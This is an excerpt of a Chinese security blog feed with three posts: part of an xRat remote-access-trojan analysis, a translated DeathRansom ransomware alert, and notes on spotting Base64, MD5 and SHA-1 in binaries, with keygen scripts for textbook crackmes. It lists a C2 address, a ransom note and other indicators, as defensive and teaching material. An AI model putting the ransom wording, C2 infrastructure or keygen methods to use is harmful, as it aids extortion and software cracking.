alt></p><h3 id="地理位置信息收集细节"><a href="#地理位置信息收集细节" class="headerlink" title="地理位置信息收集细节"></a>地理位置信息收集细节</h3><p>匹配国家图标</p><p><img src="https://i.loli.net/2020/03/07/or4qF6ObVEGwXkS.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/07/dT8jAnPvg3iNmwI.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/07/xZobBYnizwkMdcf.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/07/ZvbACH4cgSDFiek.png" alt="image.png"></p><h3 id="删除id描述文件"><a href="#删除id描述文件" class="headerlink" title="删除id描述文件"></a>删除id描述文件</h3><p><img src="https://i.loli.net/2020/03/07/1XHcbTvqi8Dg2sx.png" alt="image.png"></p><h3 id="复制执行文件"><a href="#复制执行文件" class="headerlink" title="复制执行文件"></a>复制执行文件</h3><p><img src="https://i.loli.net/2020/03/07/uxOJ6vM9jbFZPRo.png" alt="image.png"></p><h3 id="自启动注册表"><a href="#自启动注册表" class="headerlink" title="自启动注册表"></a>自启动注册表</h3><p><img src="https://i.loli.net/2020/03/07/uxOJ6vM9jbFZPRo.png" alt></p><h3 id="后门功能分三步"><a href="#后门功能分三步" class="headerlink" title="后门功能分三步"></a>后门功能分三步</h3><p><img src="https://i.loli.net/2020/03/07/RgDSn2euLvdkBQr.png" alt></p><p>确认连接状态</p><p><img src="https://i.loli.net/2020/03/07/RgDSn2euLvdkBQr.png" alt></p><h3 id="主要后门功能"><a href="#主要后门功能" class="headerlink" title="主要后门功能"></a>主要后门功能</h3><p><img src="https://i.loli.net/2020/03/07/RgDSn2euLvdkBQr.png" alt></p><p>使用HandlePacket库,使用封装好的Client的进行数据包装,传输,接收.具体功能如方法英文所示.:<img src="https://i.loli.net/2020/03/07/RgDSn2euLvdkBQr.png" alt></p><p>后门函数执行流程是这样,收到消息后,调用特定函数进行处理</p><p><img src="https://i.loli.net/2020/03/07/1WjTlnbHXGvzE76.png" alt></p><h3 id="注册Keylogger事件"><a href="#注册Keylogger事件" class="headerlink" title="注册Keylogger事件"></a>注册Keylogger事件</h3><p>15秒执行一次</p><p>使用Application重复运行Main函数</p><p><img src="https://i.loli.net/2020/03/07/OhcfDIRp8BHXVEt.png" alt></p><h4 id="Keylogger简要细节"><a href="#Keylogger简要细节" class="headerlink" title="Keylogger简要细节"></a>Keylogger简要细节</h4><p>构造函数初始化,进行Hook,注册全局事件<img src="https://i.loli.net/2020/03/07/4yqKUXRu5wxj6Ds.png" alt></p><p>并进行事件注册<img src="https://i.loli.net/2020/03/07/RX8EdsAmiPphkqr.png" alt></p><h4 id="this-Write-函数"><a href="#this-Write-函数" class="headerlink" title="this.Write()函数"></a>this.Write()函数</h4><p> 写入窗口信息,写入案件信息,并保存为<code>MM-dd-yyyy</code>格式的html,如图所示</p><p><img src="https://i.loli.net/2020/03/07/wlQL3saHr6u9DCY.png" alt="image.png"></p><h1 id="0x05-IOC"><a href="#0x05-IOC" class="headerlink" title="0x05 IOC"></a>0x05 IOC</h1><p>2b82375303c9e02ae15b0dd6e2bd0cb1</p><p><a href="http://calitevihako.cloudns.pw:1604" target="_blank" rel="noopener">http://calitevihako.cloudns.pw:1604</a></p><h1 id="0x06-reference"><a href="#0x06-reference" class="headerlink" title="0x06 reference"></a>0x06 reference</h1><h1 id="0x07-考究"><a href="#0x07-考究" class="headerlink" title="0x07 考究"></a>0x07 考究</h1><p>通过搜索部分代码,得知为开源Rat魔改而来.</p><p>此”xRat”著名Rat开源软件”quasar”fork. 恶意利用者未知.</p><p>上述开源地址为:</p><p><a href="https://github.com/tidusjar/xRAT" target="_blank" rel="noopener">https://github.com/tidusjar/xRAT</a></p><p><a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;样本名称: b3ebd2b0ac287940648975bcad2458543679748a15949f246a745c5db926a18d&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;样本大小:  252,416 字节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;家族: xRat&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MD5:  2b82375303c9e02ae15b0dd6e2bd0cb1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-1: d5dbab5cca2a370dffb7225aecbc3cf65&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-256: b3ebd2b0ac287940648975bcad2458543679748a15949f246a745c5db926a18d&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idb与样本地址:  &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-01-15-xrat&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="木马" scheme="http://blog.dgmddw.xyz/tags/%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="C#" scheme="http://blog.dgmddw.xyz/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>DeathRansom勒索病毒预警</title>
    <link href="http://blog.dgmddw.xyz/2019/11/28/2019-11-28-DeathRansom%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E9%A2%84%E8%AD%A6/"/>
    <id>http://blog.dgmddw.xyz/2019/11/28/2019-11-28-DeathRansom勒索病毒预警/</id>
    <published>2019-11-27T16:00:00.000Z</published>
    <updated>2020-03-07T13:18:03.749Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="新勒索软件DeathRansom开始成名"><a href="#新勒索软件DeathRansom开始成名" class="headerlink" title="新勒索软件DeathRansom开始成名"></a>新勒索软件DeathRansom开始成名</h1><p><img src="https://www.bleepstatic.com/content/hl-images/2019/11/25/skull-ransom-encrypt.jpg" alt></p><p>新的勒索软件<code>DeathRansom</code>伴随着坎坷的开始,但是现在已经解决了问题,并且开始感染受害者和加密他们的数据.</p><p>当<code>DeathRansom</code>第一次开始散播的时候,它假装的去加密文件,但是研究者和使用者发现他们可以删除后缀位<code>.wctc</code>的扩展,文件将能再次使用.</p><p>在9月20号左右开始发生,不过,有些事情改变了.</p><a id="more"></a><p>不仅受害者的文件被加密了,而且在<a href="https://id-ransomware.malwarehunterteam.com/" target="_blank" rel="noopener">ID Ransomware</a>勒索软件ID提交网站上关于<code>DeathRansom</code>的提交大量出现</p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/chart.jpg" alt></p><p>​                                                                        <strong>DeathRansom Submissions</strong></p><p>从初始的激增来看人数有所减少,我们仍然看见源源不断的受害者出现,这意味着仍然有可能传播活动仍在进行中.</p><p>不幸运的是,我们仍然没有发现这些勒索软件是如何传播的.</p><p>我们仍然知道的是像其他勒索软件一样,当<code>DeathRansom</code>启动时将会试图清除卷影副本.</p><p>它将会加密所有受害者计算机上的所有文件除了全路径上包括下面的字符的文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">programdata</span><br><span class="line">$recycle.bin</span><br><span class="line">program files</span><br><span class="line">windows</span><br><span class="line">all users</span><br><span class="line">appdata</span><br><span class="line">read_me.txt</span><br><span class="line">autoexec.bat</span><br><span class="line">desktop.ini</span><br><span class="line">autorun.inf</span><br><span class="line">ntuser.dat</span><br><span class="line">iconcache.db</span><br><span class="line">bootsect.bak</span><br><span class="line">boot.ini</span><br><span class="line">ntuser.dat.log</span><br><span class="line">thumbs.db</span><br></pre></td></tr></table></figure><p>与之前的非加密版本不同,正在使用的<code>DeathRansom</code>变体不会附加扩展去加密文件并且它会保持文件名.其中的数据在文件中是被加密的.</p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/hex-edit.jpg" alt="Encrypted File"></p><p>只有一个方式去识别被<code>DeathRansom</code>加密后的文件,通过文件标记查看被加密文件末尾的<code>ABEFCDAB</code> </p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/file-marker.jpg" alt></p><p>​                                                                                    <strong>File marker</strong></p><p>在每个被加密的文件的文件夹中,勒索病毒将会创建一个叫做<code>read_me.txt</code>的勒索文本,里面包含着受害者的<code>LOCK-ID</code>和联系勒索病毒开发者的邮件地址.</p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/ransom-note.jpg" alt></p><p>勒索病毒目前还在分析中并且不知道是否可以解密.</p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash:"></a>Hash:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab828f0e0555f88e3005387cb523f221a1933bbd7db4f05902a1e5cc289e7ba4</span><br></pre></td></tr></table></figure><h3 id="Ransom-note-text"><a href="#Ransom-note-text" class="headerlink" title="Ransom note text:"></a>Ransom note text:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  ?????????????????????????</span><br><span class="line">??????DEATHRansom ???????</span><br><span class="line">?????????????????????????</span><br><span class="line">Hello dear friend,</span><br><span class="line">Your files were encrypted!</span><br><span class="line">You have only 12 hours to decrypt it</span><br><span class="line">In case of no answer our team will delete your decryption password</span><br><span class="line">Write back to our e-mail: deathransom@airmail.cc</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">In your message you have to write:</span><br><span class="line">1. YOU LOCK-ID: XXX</span><br><span class="line">2. Time when you have paid 0.1 btc to this bitcoin wallet:</span><br><span class="line">xxx</span><br><span class="line"> </span><br><span class="line">After payment our team will decrypt your files immediatly</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Free decryption as guarantee:</span><br><span class="line">1. File must be less than 1MB</span><br><span class="line">2. Only .txt or .lnk files, no databases</span><br><span class="line">3. Only 1 files</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">How to obtain bitcoin:</span><br><span class="line">The easiest way to buy bitcoins is LocalBitcoins site. You have to register, click &apos;Buy bitcoins&apos;, and select the seller by payment method and price.</span><br><span class="line">https://localbitcoins.com/buy_bitcoins</span><br><span class="line">Also you can find other places to buy Bitcoins and beginners guide here:</span><br><span class="line">http://www.coindesk.com/information/how-can-i-buy-bitcoins/</span><br></pre></td></tr></table></figure><h3 id="Associated-emails"><a href="#Associated-emails" class="headerlink" title="Associated emails:"></a>Associated emails:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deathransom@airmail.cc</span><br></pre></td></tr></table></figure><h3 id="Network-connections"><a href="#Network-connections" class="headerlink" title="Network connections:"></a>Network connections:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://iplogger.org/1Zqq77</span><br></pre></td></tr></table></figure><h3 id="Registry-keys"><a href="#Registry-keys" class="headerlink" title="Registry keys:"></a>Registry keys:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Wacatac</span><br></pre></td></tr></table></figure><h4 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h4><p>翻译自<a href="https://www.bleepingcomputer.com/news/security/new-deathransom-ransomware-begins-to-make-a-name-for-itself/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/new-deathransom-ransomware-begins-to-make-a-name-for-itself/</a>文章.     </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;新勒索软件DeathRansom开始成名&quot;&gt;&lt;a href=&quot;#新勒索软件DeathRansom开始成名&quot; class=&quot;headerlink&quot; title=&quot;新勒索软件DeathRansom开始成名&quot;&gt;&lt;/a&gt;新勒索软件DeathRansom开始成名&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://www.bleepstatic.com/content/hl-images/2019/11/25/skull-ransom-encrypt.jpg&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;新的勒索软件&lt;code&gt;DeathRansom&lt;/code&gt;伴随着坎坷的开始,但是现在已经解决了问题,并且开始感染受害者和加密他们的数据.&lt;/p&gt;
&lt;p&gt;当&lt;code&gt;DeathRansom&lt;/code&gt;第一次开始散播的时候,它假装的去加密文件,但是研究者和使用者发现他们可以删除后缀位&lt;code&gt;.wctc&lt;/code&gt;的扩展,文件将能再次使用.&lt;/p&gt;
&lt;p&gt;在9月20号左右开始发生,不过,有些事情改变了.&lt;/p&gt;
    
    </summary>
    
      <category term="翻译" scheme="http://blog.dgmddw.xyz/categories/%E7%BF%BB%E8%AF%91/"/>
    
    
      <category term="勒索病毒" scheme="http://blog.dgmddw.xyz/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>常用密码学不全概括总览</title>
    <link href="http://blog.dgmddw.xyz/2019/11/22/2019-11-22-%E5%AF%86%E7%A0%81%E5%AD%A6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2019/11/22/2019-11-22-密码学逆向分析/</id>
    <published>2019-11-21T16:00:00.000Z</published>
    <updated>2020-03-09T17:21:29.909Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>想作为分析勒索病毒前的密码学接触.</p><p>常用加解密算法的逆向分析中的识别,不做过多算法原理上的叙述,别人讲的好多了.站在巨人的肩膀上.</p><p>这篇文章只作为特征查找用来辅助平时分析用.</p><p>两种工具<code>ida</code>插件<code>FindCrypt2</code>和<code>peid</code>的<code>KANA</code>进行算法识别是很好用的.</p><h3 id="updated"><a href="#updated" class="headerlink" title="updated:"></a>updated:</h3><p>2020-03-10 Salsa20.</p><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><h4 id="历史发展"><a href="#历史发展" class="headerlink" title="历史发展"></a>历史发展</h4><p><code>base64</code>最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 <code>ascii</code> 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。因此 <code>base64</code>就可以用来将二进制文件内容编码为只包含 ascii 字符的内容，这样就可以传输了.</p><p>简单来说为了兼容各种数据格式.</p><a id="more"></a><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>采用每三字节置换为四字节的方式,<code>3x8</code>24位二进制转换为<code>4x6</code>的方式,前两位用<code>0</code>填充.字符不够转换的话,空字符<code>=</code>填充.(1字节或二字节输入,那么只能使用输出的2个或3个字符)</p><p>使用字符表<code>&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</code>置换</p><p><code>Base24</code>:<code>&quot;BCDFGHJKMPQmogRTVWXY2346789&quot;</code></p><p><code>Base32</code>:<code>&quot;ABCDEFGHJKLMNOPQRSTUVWXYZ234567&quot;</code></p><p><code>Base60</code>:<code>&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx&quot;</code></p><p><code>Base85</code>:<code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&amp;&lt;&gt;()[]{}@%$#</code></p><h4 id="逆向初探"><a href="#逆向初探" class="headerlink" title="逆向初探"></a>逆向初探</h4><p><code>Findcrypt2</code>和<code>KANAL</code>都能是识别出置换表. </p><p>所以先关注置换表,然后关注下相关的位运算操作,可能就是<code>base</code>相关算法.</p><p>编码伪代码部分:<img src="https://i.loli.net/2019/11/08/CaoShdfTcil1xLW.png" alt="image.png"></p><h4 id="魔改Base64"><a href="#魔改Base64" class="headerlink" title="魔改Base64"></a>魔改Base64</h4><ol><li>置换表里的字符顺序变化或者修改置换表</li><li>将置换表分成几个不连续的部分,根据偏移进行对应的索取,或者进行加密.</li></ol><p>嘛 具体问题具体分析</p><h2 id="单向散列"><a href="#单向散列" class="headerlink" title="单向散列"></a>单向散列</h2><p>用的比较多的就是<code>MD5</code>和<code>SHA-1</code>等算法</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><p><a href="https://zhuanlan.zhihu.com/p/37257569" target="_blank" rel="noopener">这里</a>和加密与解密上都讲的挺好的,我做些我需要的东西的提炼</p><p><img src="https://gss0.bdstatic.com/-4o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=5f537e77f636afc31a013737d27080a1/c75c10385343fbf2ee0d9594b17eca8065388f67.jpg" alt="img"></p><ol><li><p>填充消息使其长度与<code>448 mod 512</code>同余,是为了后面填充<code>64</code>位的长度.</p><p>填充方法:附一个<code>1</code>在消息后面,然后用<code>0</code>填充,填充长度<code>0&lt;x&lt;=512</code></p></li><li><p>初始化最开始需要使用<code>0x67452301</code>,<code>0xefcdab89</code>,<code>0x98badcfe</code>,<code>0x10325476</code>进行初始化</p></li><li><p>然后进行数据处理,相关细节看书和源码就好.需要使用左移数组<code>{ 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7,12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10,15, 21, 6, 10, 15, 21, 6, 10, 15, 21,, 6, 10, 15, 21 }</code>和</p><p>64个存放32位字节的加法常数数组,由<code>2^32 * (abs(sin(i)))</code>得出,<code>i</code>的范围<code>1</code>到<code>64</code>.</p><p><code>{ 0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501, 0x698098d8,0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193,0xa679438e, 0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51,0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905,0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681,0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60,0xbebfbc70, 0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244,0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92,0xffeff47d, 0x85845dd1, 0x6fa87e4f, 0xfe2ce6e0, 0xa3014314,0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 };</code></p></li><li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x, y, z) (((x) &amp; (y)) | ((~(x)) &amp; (z)))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~(z))))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H(x, y, z) ((x) ^ (y) ^ (z))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I(x, y, z) ((y) ^ ((x) | (~(z))))</span></span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>512位消息分组为<code>16组 x 32位</code>,进行<code>4*16</code>次运算</p></li><li><p>128位散列值。</p></li></ol><h4 id="逆向识别"><a href="#逆向识别" class="headerlink" title="逆向识别"></a>逆向识别</h4><p><code>FindCrypt2</code>和<code>peid</code>的<code>KANA</code>都是识别加法常数</p><p>采用加密与解密中的<code>MD5KeyGen.exe</code>进行分析学习</p><ol><li><p><img src="https://i.loli.net/2019/11/10/h2CZaKHMPu6p9vl.png" alt="image.png">寄存器初始化</p></li><li><p><code>MD5</code>计算部分伪代码<img src="https://i.loli.net/2019/11/10/QVRIb6XOxkTKGzd.png" alt="image.png"></p><p>每使用16个硬编码常量,都会发现算法的改变.详细算法看上面第四点</p></li><li><p>这样简单的确定了是<code>MD5</code>算法,然后可以从<img src="https://i.loli.net/2019/11/10/YFeQ9J8L6x5GEDB.png" alt="image.png">进行回溯,<code>ida</code>识别有点问题,汇编看了下二者相等.</p></li><li><p><img src="https://i.loli.net/2019/11/22/VXMLcphBqFvzYNG.png" alt="image.png"></p><p><code>v11</code>是置换表说明<code>v4</code>可能就是计算后的值,再动态调试可知,过滤掉前面的判断进行<code>MD5</code>计算的值为<img src="https://i.loli.net/2019/11/10/cUV7GDdPbOWICQp.png" alt="image.png"></p><p>说明在中途加了<code>www.pediy.com</code>字符串,</p></li><li><p><img src="https://i.loli.net/2019/11/10/Bm78Kk9AED2yVqO.png" alt="image.png"></p><p><code>sub_4012E0</code>集成了<code>字符串添加</code>和<code>拷贝的字符大小刚好等于原字符串差64位的大小时,拷贝并直接计算MD5的功能</code>.</p><p><img src="https://i.loli.net/2019/11/10/ScCuGxXalLbw29I.png" alt="image.png"></p></li><li><p>大概的流程差不多分析出来了,基本上修改下原版<code>MD5</code>的算法就能写出注册机了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str  = input()</span><br><span class="line">str +=<span class="string">'www.pediy.com'</span></span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update(str.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hash.hexdigest()</span><br><span class="line">code = <span class="string">"23456789ABCDEFGHJKLMNPQRSTUVWXYZ"</span></span><br><span class="line">serial = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(hash),<span class="number">2</span>):</span><br><span class="line">a = <span class="string">'0x'</span> + hash[i]+hash[i+<span class="number">1</span>]</span><br><span class="line">serial = serial+code[eval(a)%<span class="number">32</span>]</span><br><span class="line">serial = serial[:<span class="number">4</span>] + <span class="string">'-'</span> + serial[<span class="number">4</span>:<span class="number">8</span>] +<span class="string">'-'</span> + serial[<span class="number">8</span>:<span class="number">12</span>] +<span class="string">'-'</span>+serial[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">print(serial)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/10/6LqRjmJ5ztACE3U.png" alt="image.png"></p></li></ol><h4 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h4><ol><li>可能会改变四个常数</li><li>改变输入后的字符,添加或者做某些运算等等</li><li>hash处理过程可能改变</li></ol><h3 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h3><p>散列值长度:<code>SHA-1</code> 160位     <code>SHA-256</code>256位     <code>SHA-384</code>  384位    <code>SHA-512</code>512位</p><p><code>SHA-2</code>包括<code>SHA-224</code>、<code>SHA-256</code>、<code>SHA-384</code>、<code>SHA-512</code>、<code>SHA-512/224</code>、<code>SHA-512/256</code></p><h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>原理参考:<a href="https://www.wosign.com/News/news_2018121101.htm" target="_blank" rel="noopener">https://www.wosign.com/News/news_2018121101.htm</a> 讲的很详细</p><h4 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h4><ol><li><p>消息填充和<code>MD5</code>一样,512位为一组,然后<code>16组x32位</code>,然后扩充位<code>80组x32位</code>,进行<code>4*20</code>次运算</p></li><li><p>使用该函数进行计算<code>A,B,C,D,E←[(A&lt;&lt;5)+ ft(B,C,D)+E+Wt+Kt],A,(B&lt;&lt;30),C,D</code>,<code>f</code>函数伪代码在下方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F0(x,y,z) ((x&amp;y)|((~x)&amp;z))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F1(x,y,z) (x^y^z)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F2(x,y,z) ((x&amp;y) | (x&amp;z)|(y&amp;z)) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F3(x,y,z) (x^y^z)</span></span><br></pre></td></tr></table></figure></li><li><p>使用常数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K0 0x5a827999L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K1 0x6ed9eba1L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K2 0x8f1bbcdcL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K3 0xca62c1d6L</span></span><br></pre></td></tr></table></figure><p>初始化寄存器的<code>hash</code>值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H0 0x67452301L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H1 0xefcdab89L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H2 0x98badcfeL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H3 0x10325476L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H4 0xc3d2e1f0L</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="逆向初探SHA-1加密"><a href="#逆向初探SHA-1加密" class="headerlink" title="逆向初探SHA-1加密"></a>逆向初探SHA-1加密</h4><p>使用加密与解密的<code>6.1.2</code>示例程序</p><ol><li><p><code>FindCrypt</code>插件识别出<code>SHA-1</code>常量</p><p><img src="https://i.loli.net/2019/11/11/ngTjxvOpDtCs2HP.png" alt="image.png"></p></li><li><p>对输入进行判断,<code>Name</code>不为空,<code>Serial</code>为20位</p><p><img src="https://i.loli.net/2019/11/11/VP3nxkvYQeytmfg.png" alt="image.png"></p></li><li><p>基本流程<img src="https://i.loli.net/2019/11/11/PRt8sFC52yKd1Tc.png" alt="image.png"></p></li><li><p>注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">output = []</span><br><span class="line">str = input()</span><br><span class="line">hash = hashlib.sha1()</span><br><span 